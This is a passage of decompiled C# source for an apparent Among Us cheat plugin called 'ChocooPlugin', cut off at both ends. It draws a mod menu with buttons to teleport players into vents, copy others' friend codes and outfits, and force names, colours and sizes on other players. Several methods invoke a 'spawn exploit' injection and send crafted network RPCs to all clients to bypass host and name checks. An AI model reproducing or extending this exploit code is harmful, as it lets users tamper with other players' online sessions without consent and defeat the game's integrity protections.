        this.TeleportToPlayer();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button("COPY FRIEND CODE", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.CopyFriendCode();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button("COPY OUTFIT", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.CopyOutfit();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button("ADD TO BLACKLIST", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.AddToBlacklist();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUI.enabled = ChocooPlugin.selectedVotekickTargetId != -1;
      if (GUILayout.Button("TP TO VENT", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.TeleportPlayerToVent();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button("TP ALL TO VENT", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.TeleportAllToVent();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUI.contentColor = new Color(0.2f, 0.7f, 0.9f);
      GUILayout.Label("Select Vent Location:", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.4f, 1f);
      if (GUILayout.Button("▼ " + ChocooPlugin.ventNames[ChocooPlugin.selectedVentId], new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.showVentDropdown = !this.showVentDropdown;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      float dropdownHeight1 = this.GetDropdownHeight("vent", this.showVentDropdown, 150f);
      if ((double) dropdownHeight1 > 1.0)
      {
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        this.ventDropdownScrollPosition = GUILayout.BeginScrollView(this.ventDropdownScrollPosition, new GUILayoutOption[1]
        {
          GUILayout.Height(dropdownHeight1)
        });
        for (int index = 0; index < ChocooPlugin.ventNames.Length; ++index)
        {
          GUI.backgroundColor = ChocooPlugin.selectedVentId == index ? new Color(0.2f, 0.7f, 0.9f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
          if (GUILayout.Button(ChocooPlugin.ventNames[index], new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
          {
            ChocooPlugin.selectedVentId = index;
            this.showVentDropdown = false;
          }
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        }
        GUILayout.EndScrollView();
        GUILayout.EndVertical();
      }
      GUILayout.Space(15f);
      if (!Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        GUI.enabled = false;
      GUI.contentColor = new Color(1f, 0.5f, 0.0f);
      GUILayout.Label("Force Name (Host)", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.enabled = ChocooPlugin.selectedVotekickTargetId != -1;
      this.DrawForceNameInputBox();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("Name Size: " + this.currentNameSize.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.enabled = ChocooPlugin.selectedVotekickTargetId != -1;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button("-", new GUILayoutOption[2]
      {
        GUILayout.Width(30f),
        GUILayout.Height(30f)
      }) && this.currentNameSize > -9999)
      {
        --this.currentNameSize;
        this.ApplyNameSize();
      }
      GUILayout.Space(3f);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button("+", new GUILayoutOption[2]
      {
        GUILayout.Width(30f),
        GUILayout.Height(30f)
      }) && this.currentNameSize < 9999)
      {
        ++this.currentNameSize;
        this.ApplyNameSize();
      }
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("Name Color:", new GUILayoutOption[1]
      {
        GUILayout.Width(100f)
      });
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button(this.nameColorNames[this.selectedNameColorIndex], new GUILayoutOption[2]
      {
        GUILayout.Width(100f),
        GUILayout.Height(30f)
      }))
        this.showNameColorDropdown = !this.showNameColorDropdown;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      float dropdownHeight2 = this.GetDropdownHeight("nameColor", this.showNameColorDropdown, 150f);
      if ((double) dropdownHeight2 > 1.0)
      {
        GUILayout.BeginVertical(GUI.skin.box, Array.Empty<GUILayoutOption>());
        this.nameColorScrollPosition = GUILayout.BeginScrollView(this.nameColorScrollPosition, new GUILayoutOption[1]
        {
          GUILayout.Height(dropdownHeight2)
        });
        for (int index = 0; index < this.nameColorNames.Length; ++index)
        {
          GUI.backgroundColor = index == this.selectedNameColorIndex ? Color.cyan : new Color(0.3f, 0.3f, 0.3f, 1f);
          if (GUILayout.Button(this.nameColorNames[index], new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
          {
            this.selectedNameColorIndex = index;
            this.showNameColorDropdown = false;
          }
        }
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
        GUILayout.EndScrollView();
        GUILayout.EndVertical();
      }
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button("FORCE NAME", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.ForcePlayerNameWithBypass();
      if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
        if (GUILayout.Button("FORCE NAME TO ALL", new GUILayoutOption[1]
        {
          GUILayout.Height(35f)
        }))
          this.ForceNameToAll();
      }
      else
      {
        GUI.enabled = false;
        GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f);
        GUILayout.Button("FORCE NAME TO ALL", new GUILayoutOption[1]
        {
          GUILayout.Height(35f)
        });
        GUI.enabled = ChocooPlugin.selectedVotekickTargetId != -1;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUI.enabled = true;
      GUI.enabled = true;
      GUILayout.Space(15f);
      if (!Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
        GUI.enabled = false;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.3f, 0.8f);
      GUILayout.Label("\uD83C\uDF08 RGB Gradient Name (Host)", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 11
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("Mode:", new GUILayoutOption[1]
      {
        GUILayout.Width(60f)
      });
      GUI.contentColor = ChocooPlugin.GetRGBText();
      string[] strArray = new string[4]
      {
        "Default",
        "All at once",
        "Left to right",
        "Right to left"
      };
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      if (GUILayout.Button(strArray[this.rgbGradientMode], new GUILayoutOption[2]
      {
        GUILayout.Width(120f),
        GUILayout.Height(25f)
      }))
      {
        this.rgbGradientMode = (this.rgbGradientMode + 1) % strArray.Length;
        this.rgbAnimationOffset = 0;
        if (this.rgbNameEnabled)
          this.lastRgbNameUpdate = Time.time - this.GetRgbUpdateInterval();
        if (this.rgbNameToAllEnabled)
          this.lastRgbNameToAllUpdate = Time.time - this.GetRgbUpdateInterval();
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      if (this.rgbGradientMode > 0)
      {
        GUI.contentColor = new Color(1f, 0.6f, 0.0f);
        GUILayout.Label("⚠️ WARNING: This mode may cause kicks!", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 10,
          wordWrap = true
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUILayout.Label("Default mode is recommended for safety.", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          wordWrap = true
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.Space(5f);
      }
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("Start Color:", new GUILayoutOption[1]
      {
        GUILayout.Width(80f)
      });
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.BeginVertical((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("R:", new GUILayoutOption[1]
      {
        GUILayout.Width(15f)
      });
      this.rgbColor1.r = GUILayout.HorizontalSlider(this.rgbColor1.r, 0.0f, 1f, new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      int num1 = (int) ((double) this.rgbColor1.r * (double) byte.MaxValue);
      GUILayout.Label(num1.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Width(30f)
      });
      GUILayout.EndHorizontal();
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("G:", new GUILayoutOption[1]
      {
        GUILayout.Width(15f)
      });
      this.rgbColor1.g = GUILayout.HorizontalSlider(this.rgbColor1.g, 0.0f, 1f, new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      num1 = (int) ((double) this.rgbColor1.g * (double) byte.MaxValue);
      GUILayout.Label(num1.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Width(30f)
      });
      GUILayout.EndHorizontal();
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("B:", new GUILayoutOption[1]
      {
        GUILayout.Width(15f)
      });
      this.rgbColor1.b = GUILayout.HorizontalSlider(this.rgbColor1.b, 0.0f, 1f, new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      num1 = (int) ((double) this.rgbColor1.b * (double) byte.MaxValue);
      GUILayout.Label(num1.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Width(30f)
      });
      GUILayout.EndHorizontal();
      GUILayout.EndVertical();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("End Color:", new GUILayoutOption[1]
      {
        GUILayout.Width(80f)
      });
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.BeginVertical((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("R:", new GUILayoutOption[1]
      {
        GUILayout.Width(15f)
      });
      this.rgbColor2.r = GUILayout.HorizontalSlider(this.rgbColor2.r, 0.0f, 1f, new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      num1 = (int) ((double) this.rgbColor2.r * (double) byte.MaxValue);
      GUILayout.Label(num1.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Width(30f)
      });
      GUILayout.EndHorizontal();
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("G:", new GUILayoutOption[1]
      {
        GUILayout.Width(15f)
      });
      this.rgbColor2.g = GUILayout.HorizontalSlider(this.rgbColor2.g, 0.0f, 1f, new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      num1 = (int) ((double) this.rgbColor2.g * (double) byte.MaxValue);
      GUILayout.Label(num1.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Width(30f)
      });
      GUILayout.EndHorizontal();
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("B:", new GUILayoutOption[1]
      {
        GUILayout.Width(15f)
      });
      this.rgbColor2.b = GUILayout.HorizontalSlider(this.rgbColor2.b, 0.0f, 1f, new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      num1 = (int) ((double) this.rgbColor2.b * (double) byte.MaxValue);
      GUILayout.Label(num1.ToString(), new GUILayoutOption[1]
      {
        GUILayout.Width(30f)
      });
      GUILayout.EndHorizontal();
      GUILayout.EndVertical();
      GUILayout.EndHorizontal();
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("RGB Name (Self):", new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      GUILayout.FlexibleSpace();
      float num2 = 45f;
      float num3 = 22f;
      Rect rect1 = GUILayoutUtility.GetRect(num2, num3);
      Color col1 = this.rgbNameEnabled ? new Color(1f, 0.3f, 0.8f, 1f) : new Color(0.25f, 0.25f, 0.25f, 1f);
      GUIStyle guiStyle1 = new GUIStyle(GUI.skin.box);
      guiStyle1.normal.background = this.MakeTex(2, 2, col1);
      GUI.backgroundColor = col1;
      GUI.Box(rect1, "", guiStyle1);
      if (GUI.Button(rect1, "", GUIStyle.none))
      {
        this.rgbNameEnabled = !this.rgbNameEnabled;
        if (this.rgbNameEnabled)
        {
          this.rgbNameToAllEnabled = false;
          this.lastRgbNameUpdate = Time.time - this.GetRgbUpdateInterval();
        }
      }
      float num4 = num3 - 4f;
      float num5 = this.rgbNameEnabled ? (float) ((double) ((Rect) ref rect1).x + (double) num2 - (double) num4 - 2.0) : ((Rect) ref rect1).x + 2f;
      GUIStyle guiStyle2 = new GUIStyle(GUI.skin.box);
      guiStyle2.normal.background = this.MakeTex(2, 2, Color.white);
      GUI.backgroundColor = Color.white;
      GUI.Box(new Rect(num5, ((Rect) ref rect1).y + 2f, num4, num4), "", guiStyle2);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("RGB Name to All:", new GUILayoutOption[1]
      {
        GUILayout.Width(120f)
      });
      GUILayout.FlexibleSpace();
      Rect rect2 = GUILayoutUtility.GetRect(num2, num3);
      Color col2 = this.rgbNameToAllEnabled ? new Color(1f, 0.3f, 0.8f, 1f) : new Color(0.25f, 0.25f, 0.25f, 1f);
      GUIStyle guiStyle3 = new GUIStyle(GUI.skin.box);
      guiStyle3.normal.background = this.MakeTex(2, 2, col2);
      GUI.backgroundColor = col2;
      GUI.Box(rect2, "", guiStyle3);
      if (GUI.Button(rect2, "", GUIStyle.none))
      {
        this.rgbNameToAllEnabled = !this.rgbNameToAllEnabled;
        if (this.rgbNameToAllEnabled)
        {
          this.rgbNameEnabled = false;
          this.lastRgbNameToAllUpdate = Time.time - this.GetRgbUpdateInterval();
        }
      }
      float num6 = this.rgbNameToAllEnabled ? (float) ((double) ((Rect) ref rect2).x + (double) num2 - (double) num4 - 2.0) : ((Rect) ref rect2).x + 2f;
      GUIStyle guiStyle4 = new GUIStyle(GUI.skin.box);
      guiStyle4.normal.background = this.MakeTex(2, 2, Color.white);
      GUI.backgroundColor = Color.white;
      GUI.Box(new Rect(num6, ((Rect) ref rect2).y + 2f, num4, num4), "", guiStyle4);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndHorizontal();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUI.enabled = true;
      GUILayout.EndScrollView();
    }

    private string CreateRgbGradientName(string baseName, Color color1, Color color2)
    {
      if (string.IsNullOrEmpty(baseName))
        return baseName;
      baseName = Regex.Replace(baseName, "<size=-?\\d+>", "");
      baseName = baseName.Replace("</size>", "");
      baseName = Regex.Replace(baseName, "<color=#?[0-9A-Fa-f]{3,8}>", "");
      baseName = baseName.Replace("</color>", "");
      baseName = Regex.Replace(baseName, "<#[0-9A-Fa-f]{3,8}>", "");
      baseName = Regex.Replace(baseName, "</?[^>]+>", "");
      if (Color.op_Equality(color1, color2))
        return $"<#{ColorUtility.ToHtmlStringRGBA(color1)}>{baseName}</color>";
      int length = baseName.Length;
      string rgbGradientName = "";
      for (int index = 0; index < length; ++index)
      {
        float num1;
        switch (this.rgbGradientMode)
        {
          case 0:
            num1 = length > 1 ? (float) index / (float) (length - 1) : 0.0f;
            break;
          case 1:
            float num2 = length > 1 ? (float) this.rgbAnimationOffset / 100f : 0.0f;
            num1 = num2 - (float) (int) num2;
            break;
          case 2:
            if (length > 1)
            {
              int num3 = (index + this.rgbAnimationOffset) % (2 * (length - 1));
              num1 = num3 <= length - 1 ? (float) num3 / (float) (length - 1) : (float) (2 * (length - 1) - num3) / (float) (length - 1);
              break;
            }
            num1 = 0.0f;
            break;
          case 3:
            if (length > 1)
            {
              int num4 = (length - 1 - index + this.rgbAnimationOffset) % (2 * (length - 1));
              num1 = num4 <= length - 1 ? (float) num4 / (float) (length - 1) : (float) (2 * (length - 1) - num4) / (float) (length - 1);
              break;
            }
            num1 = 0.0f;
            break;
          default:
            num1 = length > 1 ? (float) index / (float) (length - 1) : 0.0f;
            break;
        }
        string htmlStringRgba = ColorUtility.ToHtmlStringRGBA(Color.Lerp(color1, color2, num1));
        rgbGradientName += $"<#{htmlStringRgba}>{baseName[index]}</color>";
      }
      return rgbGradientName;
    }

    private string StripHtmlTags(string name)
    {
      if (string.IsNullOrEmpty(name))
        return name;
      name = Regex.Replace(name, "<size=-?\\d+>", "");
      name = name.Replace("</size>", "");
      name = Regex.Replace(name, "<color=#?[0-9A-Fa-f]{3,8}>", "");
      name = name.Replace("</color>", "");
      name = Regex.Replace(name, "<#[0-9A-Fa-f]{3,8}>", "");
      name = Regex.Replace(name, "</?[^>]+>", "");
      return name;
    }

    private void ApplyRgbNameToSelf()
    {
      try
      {
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        if (Object.op_Equality((Object) localPlayer, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "Local player not found");
        }
        else
        {
          string rgbGradientName = this.CreateRgbGradientName(Regex.Replace(Regex.Replace(Regex.Replace(Regex.Replace(localPlayer.Data.PlayerName, "<size=-?\\d+>", "").Replace("</size>", ""), "<color=#?[0-9A-Fa-f]{3,8}>", "").Replace("</color>", ""), "<#[0-9A-Fa-f]{3,8}>", ""), "</?[^>]+>", ""), this.rgbColor1, this.rgbColor2);
          ChocooPlugin.Logger.LogInfo((object) ("Applying RGB name to self: " + rgbGradientName));
          SpawnExploitHelper.InjectSpawnExploitTo((InnerNetObject) localPlayer);
          SpawnExploitHelper.InjectSpawnExploitTo((InnerNetObject) localPlayer);
          foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl, (Object) PlayerControl.LocalPlayer))
            {
              try
              {
                MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) localPlayer).NetId, (byte) 6, (SendOption) 1, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl));
                messageWriter.Write(((InnerNetObject) localPlayer).NetId);
                messageWriter.Write(rgbGradientName);
                ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
              }
              catch (Exception ex)
              {
                ChocooPlugin.Logger.LogWarning((object) ("Failed to send RGB name RPC: " + ex.Message));
              }
            }
          }
          localPlayer.SetName(rgbGradientName);
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ApplyRgbNameToSelf error: " + ex.Message));
      }
    }

    private void ApplyRgbNameToAll()
    {
      try
      {
        if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "You must be host to apply RGB names to all");
        }
        else
        {
          foreach (PlayerControl target in PlayerControl.AllPlayerControls.ToArray())
          {
            if (!Object.op_Equality((Object) target, (Object) null) && !Object.op_Equality((Object) target.Data, (Object) null))
            {
              string rgbGradientName = this.CreateRgbGradientName(Regex.Replace(Regex.Replace(Regex.Replace(Regex.Replace(target.Data.PlayerName, "<size=-?\\d+>", "").Replace("</size>", ""), "<color=#?[0-9A-Fa-f]{3,8}>", "").Replace("</color>", ""), "<#[0-9A-Fa-f]{3,8}>", ""), "</?[^>]+>", ""), this.rgbColor1, this.rgbColor2);
              ChocooPlugin.Logger.LogInfo((object) ("Applying RGB to " + target.Data.PlayerName));
              SpawnExploitHelper.InjectSpawnExploitTo((InnerNetObject) target);
              SpawnExploitHelper.InjectSpawnExploitTo((InnerNetObject) target);
              foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
              {
                if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl, (Object) PlayerControl.LocalPlayer))
                {
                  try
                  {
                    MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) target).NetId, (byte) 6, (SendOption) 1, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl));
                    messageWriter.Write(((InnerNetObject) target).NetId);
                    messageWriter.Write(rgbGradientName);
                    ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
                  }
                  catch (Exception ex)
                  {
                    ChocooPlugin.Logger.LogWarning((object) ("Failed to send RGB RPC: " + ex.Message));
                  }
                }
              }
              target.SetName(rgbGradientName);
            }
          }
          ChocooPlugin.Logger.LogInfo((object) "Applied RGB names to all players");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ApplyRgbNameToAll error: " + ex.Message));
      }
    }

    private void DrawForceNameInputBox()
    {
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.white;
      GUILayout.Label("New Name:", new GUILayoutOption[1]
      {
        GUILayout.Width(80f)
      });
      Rect rect1 = GUILayoutUtility.GetRect(150f, 30f, new GUILayoutOption[2]
      {
        GUILayout.Width(150f),
        GUILayout.ExpandWidth(false)
      });
      if (Event.current.type == 0)
      {
        if (((Rect) ref rect1).Contains(Event.current.mousePosition))
        {
          this.forceNameBoxFocused = true;
          Event.current.Use();
        }
        else if (this.forceNameBoxFocused)
          this.forceNameBoxFocused = false;
      }
      GUI.backgroundColor = this.forceNameBoxFocused ? new Color(1f, 1f, 0.7f, 1f) : Color.white;
      GUI.Box(rect1, "");
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUIStyle guiStyle = new GUIStyle(GUI.skin.label)
      {
        alignment = (TextAnchor) 3,
        normal = new GUIStyleState()
        {
          textColor = Color.white
        }
      };
      string str = this.forceNameInput;
      if (this.forceNameBoxFocused && this.forceNameShowCursor)
      {
        if (this.forceNameCursorPos >= this.forceNameInput.Length)
          str += "|";
        else if (this.forceNameCursorPos >= 0 && this.forceNameCursorPos < this.forceNameInput.Length)
          str = str.Insert(this.forceNameCursorPos, "|");
      }
      Rect rect2;
      // ISSUE: explicit constructor call
      ((Rect) ref rect2).\u002Ector(((Rect) ref rect1).x + 5f, ((Rect) ref rect1).y, ((Rect) ref rect1).width - 10f, ((Rect) ref rect1).height);
      GUI.Label(rect2, str, guiStyle);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndHorizontal();
    }

    private void ForcePlayerNameWithBypass()
    {
      try
      {
        if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
          ChocooPlugin.Logger.LogWarning((object) "You must be host to force names");
        else if (ChocooPlugin.selectedVotekickTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected");
        }
        else
        {
          PlayerControl target = (PlayerControl) null;
          foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl.Data, (Object) null) && playerControl.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              target = playerControl;
              break;
            }
          }
          if (Object.op_Equality((Object) target, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player");
          }
          else
          {
            string str1;
            if (string.IsNullOrWhiteSpace(this.forceNameInput))
            {
              str1 = Regex.Replace(Regex.Replace(target.Data.PlayerName, "<size=\\d+>", ""), "<color=#[0-9A-Fa-f]{3,6}>", "").Replace("</size>", "").Replace("</color>", "");
              ChocooPlugin.Logger.LogInfo((object) ("Applying color/size to existing name: " + str1));
            }
            else
            {
              str1 = this.forceNameInput;
              ChocooPlugin.Logger.LogInfo((object) $"Forcing name on: {target.Data.PlayerName} to: {str1}");
            }
            string str2 = $"<size={this.currentNameSize.ToString()}><color={this.nameColorCodes[this.selectedNameColorIndex]}>{str1}</color></size>";
            if (!ChocooPlugin.InjectSpawnExploitTo(target))
            {
              ChocooPlugin.Logger.LogError((object) "Spawn exploit injection failed");
            }
            else
            {
              foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
              {
                if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl, (Object) PlayerControl.LocalPlayer))
                {
                  try
                  {
                    MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) target).NetId, (byte) 6, (SendOption) 0, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl));
                    messageWriter.Write(((InnerNetObject) target).NetId);
                    messageWriter.Write(str2);
                    ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
                  }
                  catch (Exception ex)
                  {
                    ChocooPlugin.Logger.LogWarning((object) ("Failed to send to player: " + ex.Message));
                  }
                }
              }
              target.SetName(str2);
              ChocooPlugin.Logger.LogInfo((object) "Name change complete!");
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Forced name: " + str1);
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Force name error: " + ex.Message));
      }
    }

    private void ForceNameToAll()
    {
      try
      {
        if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
        {
          ChocooPlugin.Logger.LogWarning((object) "You must be host to force names to all players");
        }
        else
        {
          ChocooPlugin.Logger.LogInfo((object) "Forcing name/color/size to all players");
          int num = 0;
          foreach (PlayerControl target in PlayerControl.AllPlayerControls.ToArray())
          {
            if (!Object.op_Equality((Object) target, (Object) null) && !Object.op_Equality((Object) target.Data, (Object) null) && !target.Data.Disconnected)
            {
              try
              {
                string str = string.IsNullOrEmpty(this.forceNameInput) ? Regex.Replace(Regex.Replace(Regex.Replace(Regex.Replace(target.Data.PlayerName, "<size=-?\\d+>", "").Replace("</size>", ""), "<color=#?[0-9A-Fa-f]{3,8}>", "").Replace("</color>", ""), "<#[0-9A-Fa-f]{3,8}>", ""), "</?[^>]+>", "") : this.forceNameInput;
                if (this.currentNameSize != 12)
                  str = $"<size={this.currentNameSize.ToString()}>{str}</size>";
                if (this.selectedNameColorIndex != 11)
                  str = $"<color={this.nameColorCodes[this.selectedNameColorIndex]}>{str}</color>";
                SpawnExploitHelper.InjectSpawnExploitTo((InnerNetObject) target);
                SpawnExploitHelper.InjectSpawnExploitTo((InnerNetObject) target);
                Thread.Sleep(50);
                MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) target).NetId, (byte) 6, (SendOption) 1, -1);
